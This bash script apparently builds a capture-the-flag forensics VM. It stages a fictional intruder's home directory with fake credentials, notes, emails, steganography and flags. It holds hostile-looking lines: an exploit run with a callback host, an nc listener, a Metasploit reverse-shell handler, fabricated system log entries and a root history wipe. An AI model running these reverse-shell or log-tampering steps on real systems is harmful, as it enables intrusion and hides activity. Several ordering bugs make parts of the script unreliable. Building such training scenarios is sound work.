#!/bin/bash

# === Configuration ===
TARGET_USER="ghost"
TARGET_HOME="/home/${TARGET_USER}"
TARGET_IP_INTERNAL="172.16.10.5"         # Target Internal SSH Box
TARGET_WEB_PORTAL="portal.${TARGET_DOMAIN_EXTERNAL}" # Target Web App
TARGET_DOMAIN_EXTERNAL="targetcorp.com" # Target Domain
VPN_SERVER_IP="vpn.nulldivision.internal" # VPN server (use internal hostname)
DIRECTOR_IP="director.nulldivision.internal" # Flag Server (use internal hostname)
DIRECTOR_PORT="9999"
GHOST_WEAK_PASS="password123"           # ghost user password
SSH_KEY_PASS="GhostInTheShell2077"        # Password for the encrypted SSH key
ZIP_PASS="ProjectChimera!"          # Password for the encrypted zip
KEEPASS_PASS="ChangeMe123!"           # Weak password for KeePass DB
ADMIN_EMAIL="admin@${TARGET_DOMAIN_EXTERNAL}" # Target admin email guess
CANARY_EMAIL="anonymous_canary@protonmail.com" # Contact email

# === Helper Function for Ownership ===
set_owner() {
  chown -R $TARGET_USER:$TARGET_USER "$1" &>/dev/null # Suppress errors for non-existent files during cleanup
}

# === Helper Function for Timestamp Variation ===
touch_random_time() {
    local filename="$1"
    local random_secs=$(( RANDOM % 3600 * 24 * 30 )) # Random time within last ~30 days
    touch -d "@$(($(date +%s) - random_secs))" "$filename"
}

# === Initial Checks and Setup ===
echo "[*] Starting Enhanced 0xGhost VM Population Script..."

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root"
   exit 1
fi

# Ensure target user exists, create if not
if ! id "$TARGET_USER" &>/dev/null; then
    echo "[*] User $TARGET_USER not found. Creating..."
    useradd -m -s /bin/bash $TARGET_USER
    echo "${TARGET_USER}:${GHOST_WEAK_PASS}" | chpasswd
    adduser $TARGET_USER sudo # Add to sudo group (adjust group name if needed)
    echo "[*] User $TARGET_USER created with password '${GHOST_WEAK_PASS}'."
else
    echo "[*] User $TARGET_USER exists."
fi

# Ensure home directory exists
mkdir -p $TARGET_HOME
set_owner $TARGET_HOME

echo "[*] Installing necessary tools (requires internet)..."
# Added keepassxc for database creation, libnotify-bin for notify-send (makes logs more real), apache2-utils for htpasswd
apt-get update
apt-get install -y zip steghide git openssl ssh coreutils vim net-tools tree keepassxc libnotify-bin apache2-utils curl wget jq python3-pip filezilla # Common tools
# python3 -m pip install beautifulsoup4 requests # Example Python libs Ghost might use

echo "[*] Creating extensive directory structure..."
mkdir -p ${TARGET_HOME}/{Documents/research/project_chimera/{payloads,recon_data,notes},Downloads/torrents,Notes/personal,scripts/{recon,exploit},dev/project_chimera/src,.config/{terminator,sublime-text},.local/share/Trash/files,.local/share/Trash/info,.irssi/logs,vpn_configs,Pictures,Mail/{inbox,sent},.mozilla/firefox/profile.default/storage/default,.ssh/keys_archive,.cache/pip,tools/{web,net,misc}}
set_owner ${TARGET_HOME}

echo "[*] Populating shell history (more entries)..."
cat << EOF >> ${TARGET_HOME}/.bash_history
tree ~/Documents/research/
nmap -sV -sC -oX ~/Documents/research/project_chimera/recon_data/targetcorp_scan.xml $TARGET_DOMAIN_EXTERNAL
gobuster dir -u https://$TARGET_DOMAIN_EXTERNAL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ~/Documents/research/project_chimera/recon_data/gobuster_results.txt
ssh ghost@$TARGET_IP_INTERNAL -i ~/.ssh/id_ed25519
git clone https://github.com/some-vuln/exploit-poc.git ~/dev/poc_tool
cd ~/dev/poc_tool
python3 exploit.py --target $TARGET_WEB_PORTAL --lhost $VPN_SERVER_IP --lport 4444
# Failed attempt
python3 exploit.py --target $TARGET_WEB_PORTAL --lhost 192.168.1.101 --lport 4444
sudo mount /dev/sdb1 /mnt/secretz # Still failing hint
nc -lvnp 4444
vim ~/Documents/research/project_chimera/notes/main_strategy.md
ping $TARGET_DOMAIN_EXTERNAL
whois $TARGET_DOMAIN_EXTERNAL
locate id_rsa
cp ~/.ssh/id_rsa_ghost_encrypted ~/.ssh/keys_archive/backup_vpn_key_$(date +%Y%m%d).key
zip -e -P '${ZIP_PASS}' ~/Downloads/chimera_backup.zip ~/Documents/research/project_chimera/
# rm ~/Downloads/chimera_backup.zip # Decided against deleting it this time?
sudo updatedb
find / -name "*secret*" -type f 2>/dev/null
proxychains firefox https://$TARGET_WEB_PORTAL &
curl -x socks5h://localhost:9050 https://check.torproject.org/api/ip # Checking tor?
cat ~/Mail/inbox/msg_from_ZF_01.eml
keepassxc # Ran the KeePass client
htpasswd -nb admin temp_password # Generating hash?
EOF
set_owner "${TARGET_HOME}/.bash_history"

echo "[*] Placing more detailed notes and documents..."
# Main Research Notes
cat << EOF > ${TARGET_HOME}/Documents/research/project_chimera/notes/main_strategy.md
# Project Chimera - Strategy

**Objective:** Infiltrate TargetCorp, locate proprietary algorithm source code (Project "Griffin"?).

**Attack Vectors:**
1.  **Web Portal ($TARGET_WEB_PORTAL):** Looks custom. Trying SQLi, default creds, maybe file upload vuln? WAF blocks basic stuff. Need bypass. _See recon_data/gobuster_results.txt_.
2.  **SSH ($TARGET_IP_INTERNAL):** Exposed internal box? Used 'ghost' account, maybe weak password or key re-use? Seems promising. _Need to try key found_.
3.  **Phishing:** Target Alice Manager ($ADMIN_EMAIL?)? High risk, low priority for now.

**Credentials:**
- Found some old creds in KeePass DB (`~/Documents/ghost_secrets.kdbx`), password is 'ChangeMe123!' (NEED TO CHANGE THIS!). Mostly junk?
- VPN key password reminder: "That Keanu Reeves movie, you know, cyberpunk... year it came out?" -> **${SSH_KEY_PASS}** (Hint)
- Zip password: What's the project name, screamed? -> **${ZIP_PASS}** (Hint)

**Concerns:**
- Increased network chatter detected by ZF. Mole possible?
- Need to exfiltrate findings securely. Tor? Or dedicated drop server?
- Need the key/location for Canary's data drop. _Check emails?_
FLAG{MAIN_STRATEGY_DOCUMENT_LOCATED}
EOF
touch_random_time ${TARGET_HOME}/Documents/research/project_chimera/notes/main_strategy.md

# Personal Notes
cat << EOF > ${TARGET_HOME}/Notes/personal/reminders.txt
- Pay rent
- Change KeePass password!!!
- Backup important files to external drive (buy one)
- Check signal from Canary again - deadline approaching.
- Remember stego key: 'steganography' (simple, need better) for sky.png
EOF
touch_random_time ${TARGET_HOME}/Notes/personal/reminders.txt

# "Hidden" Note with space in filename
HIDDEN_NOTE_FILE="${TARGET_HOME}/Notes/. hidden config " # Note the trailing space
cat << EOF > "${HIDDEN_NOTE_FILE}"
Trying to hide some API keys here:
AWS_KEY: AKIAFAKEKEY............
AWS_SECRET: FAKESECRETKEY.............../XXX
Might use this later for cloud exfil.
FLAG{FOUND_HIDDEN_SPACED_FILE}
EOF
touch_random_time "${HIDDEN_NOTE_FILE}"

# Placeholders using fallocate
echo "[*] Creating large placeholder files..."
fallocate -l 5G ${TARGET_HOME}/Downloads/torrents/windows11_pro_insider.iso &>/dev/null
fallocate -l 10G ${TARGET_HOME}/Documents/research/project_chimera/canary_encrypted_data.img &>/dev/null
touch_random_time ${TARGET_HOME}/Downloads/torrents/windows11_pro_insider.iso
touch_random_time ${TARGET_HOME}/Documents/research/project_chimera/canary_encrypted_data.img

# KeePass Database
echo "[*] Creating KeePass database..."
# This requires keepassxc CLI interaction which is complex to script non-interactively.
# We'll create a dummy file and note that it *should* be created manually or with expect script.
# Manual Way: Open KeePassXC GUI -> Create new database -> ~/Documents/ghost_secrets.kdbx -> Set password -> Add dummy entries.
# Placeholder file:
cat << EOF > ${TARGET_HOME}/Documents/ghost_secrets.kdbx.txt
This is a placeholder. A real .kdbx file should be here.
Password: ${KEEPASS_PASS}
Contains entries like:
- TargetCorp Portal (Test) - user: test pass: test
- Old Git Repo - user: ghost pass: P@ssw0rd! (compromised)
- ZF IRC Login - user: 0xGhost pass: ??? (forgot to save)
FLAG{ACCESSED_KEEPASS_PLACEHOLDER}
EOF
# For a real file (complex): Requires `expect` scripting or pre-creating the DB and copying it.
# Example dummy entries for manual creation:
# Title: TargetCorp Portal (Test), User: test, Pass: test, URL: https://$TARGET_WEB_PORTAL
# Title: Old Personal Git, User: ghost, Pass: P@ssw0rd!
# Title: Local SSH Key (id_ed25519), Notes: No password set for this one.
touch_random_time ${TARGET_HOME}/Documents/ghost_secrets.kdbx.txt


set_owner ${TARGET_HOME}/Documents
set_owner ${TARGET_HOME}/Notes
set_owner "${HIDDEN_NOTE_FILE}"
set_owner ${TARGET_HOME}/Downloads

echo "[*] Setting up enhanced connectivity clues (VPN/SSH/Proxy)..."
# VPN Config (Same as before, ensure paths match reality)
mkdir -p ${TARGET_HOME}/vpn_configs
cp ${TARGET_HOME}/.ssh/id_rsa_ghost_encrypted.pub ${TARGET_HOME}/vpn_configs/ghost_vpn.pub # Add pub key here too
# ... (keep existing OVPN config generation) ...
cat << EOF > ${TARGET_HOME}/vpn_configs/Nu11Division_Ops.ovpn
client
dev tun
proto udp
remote $VPN_SERVER_IP 1194
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
cipher AES-256-CBC
verb 3
# Using key from main ssh dir for "security"
ca /home/$TARGET_USER/vpn_configs/ca.crt
cert /home/$TARGET_USER/vpn_configs/ghost.crt  # Made-up cert file, could be same as SSH .pub? Unlikely but possible user error.
key /home/$TARGET_USER/.ssh/id_rsa_ghost_encrypted # ENCRYPTED Key file!
# Possible route for internal net?
# route 10.0.0.0 255.0.0.0
EOF
openssl req -nodes -new -x509 -keyout ${TARGET_HOME}/vpn_configs/ca.key -out ${TARGET_HOME}/vpn_configs/ca.crt -subj "/C=XX/ST=NU/L=NULL/O=Nu11Division/OU=Ops/CN=Nu11DivisionCA" &>/dev/null
openssl req -nodes -new -x509 -keyout ${TARGET_HOME}/vpn_configs/ghost.key -out ${TARGET_HOME}/vpn_configs/ghost.crt -subj "/C=XX/ST=NU/L=NULL/O=Nu11Division/OU=Users/CN=0xGhostVPN" &>/dev/null
rm ${TARGET_HOME}/vpn_configs/ca.key ${TARGET_HOME}/vpn_configs/ghost.key # Remove private parts of cert generation

# --- SSH Config --- (Expanded)
mkdir -p ${TARGET_HOME}/.ssh/keys_archive
chmod 700 ${TARGET_HOME}/.ssh
# ... (keep existing SSH key generation: id_ed25519 and id_rsa_ghost_encrypted) ...
ssh-keygen -t ed25519 -f ${TARGET_HOME}/.ssh/id_ed25519 -N "" -C "${TARGET_USER}@ghost-dev-$(date +%s)" &>/dev/null
ssh-keygen -t rsa -b 4096 -f ${TARGET_HOME}/.ssh/id_rsa_ghost_encrypted -N "$SSH_KEY_PASS" -C "${TARGET_USER}@vpn-access-$(date +%s)" &>/dev/null

# SSH Config file
cat << EOF > ${TARGET_HOME}/.ssh/config
Host target_internal
    HostName $TARGET_IP_INTERNAL
    User ghost
    IdentityFile ~/.ssh/id_ed25519 # Unencrypted key for this internal target
    Port 22

Host target_portal_ssh_maybe # Ghost speculating?
    HostName $TARGET_WEB_PORTAL
    User root # Unlikely guess
    Port 22

Host jumpbox.targetcorp.com
    HostName jump.targetcorp.com # Different actual hostname?
    User svc_deploy
    Port 2222
    IdentityFile ~/.ssh/keys_archive/id_rsa_target_jump # Key doesn't exist yet

Host *.nulldivision.internal
    User ops_user
    IdentityFile ~/.ssh/id_rsa_ghost_encrypted # Use VPN key internally too?
    ProxyCommand none

Host *
    # Commented out default setting
    # StrictHostKeyChecking no
    # UserKnownHostsFile=/dev/null
EOF

# Known Hosts (add more variety)
cat << EOF > ${TARGET_HOME}/.ssh/known_hosts
$TARGET_IP_INTERNAL ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJk.....FAKE....KEY....ENTRY.....=
$TARGET_DOMAIN_EXTERNAL,portal.$TARGET_DOMAIN_EXTERNAL ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJp.....FAKE....KEY....ENTRY.....=
github.com ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAq2A7hRGmdnm9tUDbO9IDSwBK6TbQa+PXYPCPy6rbTrTtw7PHkccKrpp0yVhp5HdEIcKr6pLlVDBfOLX9QUsyCOV0wzfjIJNlGEYsdlLJizHhbn2mUjvSAHQqZETYP81eFzLQNnPHt4EVVUh7VfDESU84KezmD5QlWpXLmvU31/yMf+Se8xhHTvKSCZIFImWwoG6mbUoWf9nzpIoaSjB+weqqUUmpaaasXVal72J+UX2B+2RPW3RcT0eOzQgqlJL3RKrTJvdsjE3JEAvGq3lGHSZXy28G3skua2SmVi/w4yCE6gbODqnTWlg7+wC604ydGXA8VJiS5ap43JXiUFFAaQ==
jump.targetcorp.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILo.....FAKE....KEY....ENTRY.....=
EOF
touch_random_time ${TARGET_HOME}/.ssh/config
touch_random_time ${TARGET_HOME}/.ssh/known_hosts

# Proxychains Config
cat << EOF > ${TARGET_HOME}/.proxychains/proxychains.conf
# proxychains.conf  VER 4.x
strict_chain
proxy_dns
# Add the following line(s) to activate proxying:
[ProxyList]
# defaults set to "tor"
socks5  127.0.0.1 9050
# socks4  127.0.0.1 9051 # Example commented out alternate proxy
EOF
mkdir -p ${TARGET_HOME}/.proxychains
cp ${TARGET_HOME}/.proxychains/proxychains.conf /etc/proxychains.conf # Put one system-wide too

set_owner ${TARGET_HOME}/vpn_configs
set_owner ${TARGET_HOME}/.ssh
set_owner ${TARGET_HOME}/.proxychains

echo "[*] Placing Flag Submission Instructions (same method)..."
cat << EOF > ${TARGET_HOME}/Notes/README_ZF_CONTACT.txt
Ghost,

Use the Ops VPN config (`~/vpn_configs/Nu11Division_Ops.ovpn`). Key is encrypted (`~/.ssh/id_rsa_ghost_encrypted`), password reminder is in your main strategy notes. Find them!

Report flags IMMEDIATELY. Target: **nc $DIRECTOR_IP $DIRECTOR_PORT**
Format: **FLAG{flag_value_here}**

First validation flag (also in strategy notes): **FLAG{MAIN_STRATEGY_DOCUMENT_LOCATED}**
The REAL first flag from me (send this first!): **FLAG{ZEROFRAME_INSTRUCTIONS_RECEIVED}**

Got word Canary is ready for contact. Details in email marked URGENT. Check your inbox (`~/Mail/inbox`). Don't mess this up.

-ZF
EOF
set_owner ${TARGET_HOME}/Notes/README_ZF_CONTACT.txt

echo "[*] Creating simulated emails..."
MAIL_DIR=${TARGET_HOME}/Mail/inbox
SENT_DIR=${TARGET_HOME}/Mail/sent
mkdir -p $MAIL_DIR $SENT_DIR

# Email from ZF
cat << EOF > ${MAIL_DIR}/msg_from_ZF_01.eml
From: Zer0Frame <zf@nulldivision.internal>
To: 0xGhost <ghost@nulldivision.internal>
Subject: URGENT - Canary Contact
Date: $(date -R -d "-2 days")

Ghost,

Canary is ready. Sensitive. Use Protonmail for contact: ${CANARY_EMAIL}
Reference "Project Chimera - Phase 4 Delivery".
They have the encrypted package location. Expecting key exchange protocol DeltaCharlie.
Do NOT use Nul1Div comms for this. Burner email only.

Find what we need. Get out clean.

-ZF
FLAG{CANARY_CONTACT_DETAILS_RECEIVED}
EOF
touch_random_time ${MAIL_DIR}/msg_from_ZF_01.eml

# Email from "TargetCorp HR" (Phishing test? Spam?)
cat << EOF > ${MAIL_DIR}/msg_hr_phish_test.eml
From: TargetCorp HR <hr@targetcorp.com>
To: ghost_applicant@email.com # Old email maybe?
Subject: Your Application Status Update
Date: $(date -R -d "-10 days")

Dear Applicant,

Thank you for your interest in TargetCorp. Please login to our secure portal to update your profile and view current opportunities:

https://$TARGET_WEB_PORTAL/applicant_login

We look forward to hearing from you!

Sincerely,
TargetCorp Human Resources
EOF
touch_random_time ${MAIL_DIR}/msg_hr_phish_test.eml

# Sent email TO ZF (shows Ghost's paranoia)
cat << EOF > ${SENT_DIR}/msg_to_ZF_concerns.eml
From: 0xGhost <ghost@nulldivision.internal>
To: Zer0Frame <zf@nulldivision.internal>
Subject: Re: Status Update - Concerns
Date: $(date -R -d "-3 days")

ZF,

Acknowledged previous messages. Making progress on TargetCorp but hitting WAF issues. Also, internal SSH box ($TARGET_IP_INTERNAL) needs the right key/pass.

Feeling watched. Seeing odd traffic spikes on VPN. Could be coincidence, could be heat. Recommend comms silence for a bit unless critical like Canary update.

Will proceed carefully. Backup plan involves TOR exfil if needed.

-Ghost
EOF
touch_random_time ${SENT_DIR}/msg_to_ZF_concerns.eml

set_owner ${TARGET_HOME}/Mail

# === Deeper Forensics / Hidden Clues ===

echo "[*] Creating encrypted archive (same as before)..."
# ... (Keep existing zip creation logic) ...
mkdir -p ${TARGET_HOME}/Documents/research/project_chimera/sensitive_data
echo "TargetCorp Internal Structure Guess: Fileserver @ 10.0.10.50 contains //SHARE/Financials" > ${TARGET_HOME}/Documents/research/project_chimera/sensitive_data/internal_notes.txt
echo "Insider contact 'Canary' provided encrypted drive image. Need key. Protocol DeltaCharlie??" > ${TARGET_HOME}/Documents/research/project_chimera/sensitive_data/contact_info.txt
set_owner ${TARGET_HOME}/Documents/research/project_chimera/sensitive_data
zip -r -e -P "${ZIP_PASS}" ${TARGET_HOME}/Downloads/chimera_backup.zip ${TARGET_HOME}/Documents/research/project_chimera/sensitive_data &>/dev/null
set_owner ${TARGET_HOME}/Downloads/chimera_backup.zip
touch_random_time ${TARGET_HOME}/Downloads/chimera_backup.zip

echo "[*] Hiding data with steganography (same image, different tool/pass maybe)..."
# ... (Keep existing steghide logic using sky.png) ...
convert -size 100x60 xc:skyblue ${TARGET_HOME}/Pictures/sky.png
echo "FLAG{STEGO_SKY_IS_BLUE_${RANDOM}}" > /tmp/secret.txt
steghide embed -cf ${TARGET_HOME}/Pictures/sky.png -ef /tmp/secret.txt -p "steganography" -q &>/dev/null # Use pass from notes
rm /tmp/secret.txt
set_owner ${TARGET_HOME}/Pictures/sky.png
touch_random_time ${TARGET_HOME}/Pictures/sky.png

# Add another hidden clue - Base64 encoded string in a config file
echo "[*] Hiding Base64 data in dummy config..."
mkdir -p ${TARGET_HOME}/.config/some_app
echo "user_setting = true" > ${TARGET_HOME}/.config/some_app/config.ini
echo "# Debug flag, do not enable in prod" >> ${TARGET_HOME}/.config/some_app/config.ini
echo "debug_level = 0" >> ${TARGET_HOME}/.config/some_app/config.ini
echo "# Old key backup: $(echo 'FLAG{BASE64_HIDDEN_IN_CONFIG}' | base64)" >> ${TARGET_HOME}/.config/some_app/config.ini
set_owner ${TARGET_HOME}/.config/some_app
touch_random_time ${TARGET_HOME}/.config/some_app/config.ini

echo "[*] Placing miscellaneous files & tool configs..."
# Dummy scripts
mkdir -p ${TARGET_HOME}/scripts/{recon,exploit}
cat << EOF > ${TARGET_HOME}/scripts/recon/quick_scan.sh
#!/bin/bash
if [ -z "\$1" ]; then echo "Usage: \$0 <target>"; exit 1; fi
echo "[*] Running quick Nmap on \$1"
nmap -T4 -F \$1
echo "[*] Running dirb on http://\$1"
dirb http://\$1 /usr/share/wordlists/dirb/common.txt -o quick_dirb_\$1.txt
EOF
chmod +x ${TARGET_HOME}/scripts/recon/quick_scan.sh

# Example Metasploit resource script
mkdir -p ${TARGET_HOME}/.msf4/logs
cat << EOF > ${TARGET_HOME}/.msf4/targetcorp_exploit.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $VPN_SERVER_IP # Using internal VPN IP
set LPORT 4444
exploit -j -z
# Needs specific exploit for target later
# use exploit/windows/web/some_vuln
# set RHOSTS $TARGET_WEB_PORTAL
# set RPORT 8080
# run
EOF
touch_random_time ${TARGET_HOME}/.msf4/targetcorp_exploit.rc

set_owner ${TARGET_HOME}/scripts
set_owner ${TARGET_HOME}/.msf4

echo "[*] Adding more fake log entries..."
# Simulate some user activity logs
echo "$(date '+%b %d %H:%M:%S') $HOSTNAME systemd[1]: Started User Manager for UID 1000." >> /var/log/syslog
echo "$(date '+%b %d %H:%M:%S') $HOSTNAME pulseaudio[1234]: Error opening PCM device front:0: Device or resource busy" >> /var/log/syslog # Common desktop noise
# Simulate web tool usage log
echo "[+] $(date '+%Y-%m-%d %H:%M:%S') - Testing connection to https://$TARGET_WEB_PORTAL..." >> ${TARGET_HOME}/tools/web/curl_log.txt
echo "[+] $(date '+%Y-%m-%d %H:%M:%S') - Got 302 Redirect to /login" >> ${TARGET_HOME}/tools/web/curl_log.txt
touch_random_time ${TARGET_HOME}/tools/web/curl_log.txt
# Simulate failed login attempts logged locally?
echo "$(date '+%Y-%m-%d %H:%M:%S') Failed login attempt for user 'admin' on $TARGET_IP_INTERNAL (via SSH key)" >> ${TARGET_HOME}/Notes/failed_logins.log
touch_random_time ${TARGET_HOME}/Notes/failed_logins.log
# Simulate notification
# sudo -u $TARGET_USER DISPLAY=:0 DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus notify-send "VPN Connection Lost" "Attempting to reconnect to $VPN_SERVER_IP..." # This likely won't display but logs D-Bus calls

# Append more to system logs
echo "$(date '+%b %d %H:%M:%S') $HOSTNAME kernel: usb 1-1: new high-speed USB device number 9 using xhci_hcd" >> /var/log/syslog
echo "$(date '+%b %d %H:%M:%S') $HOSTNAME keepassxc[2345]: Database opened: ${TARGET_HOME}/Documents/ghost_secrets.kdbx" >> /var/log/syslog # Simulate app logging
echo "$(date '+%b %d %H:%M:%S') $HOSTNAME CRON[5678]: (root) CMD ( cd / && run-parts --report /etc/cron.hourly)" >> /var/log/auth.log
set_owner ${TARGET_HOME}/tools
set_owner ${TARGET_HOME}/Notes/failed_logins.log


# === Final Cleanup ===
echo "[*] Cleaning up script traces..."
# Clear history of the root user running this script
history -c
history -w

# Clean apt cache to save space on image
apt-get clean

# Optional: remove this script itself after execution
# rm -- "$0"

echo "[***] 0xGhost VM Enhanced Population Complete! [***]"
echo "[!!!] >>> Remember to shut down the VM cleanly NOW <<<"
echo "[!!!] >>> Create your VM snapshot or export the disk image <<<"
echo "[!!!] Manually browse sites, run KeepassXC to create the DB, use text editors etc."
echo "[!!!] BEFORE finalizing the image adds SIGNIFICANT realism."

exit 0